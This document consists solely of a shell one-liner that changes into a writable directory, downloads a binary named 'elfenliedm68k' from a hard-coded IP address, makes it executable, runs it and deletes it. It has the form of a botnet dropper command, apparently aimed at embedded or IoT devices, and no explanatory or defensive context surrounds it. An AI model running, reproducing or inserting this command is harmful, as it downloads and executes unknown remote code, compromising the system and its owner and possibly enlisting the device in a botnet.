cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.227.160/elfenliedm68k; chmod +x elfenliedm68k; ./elfenliedm68k; rm -rf elfenliedm68k
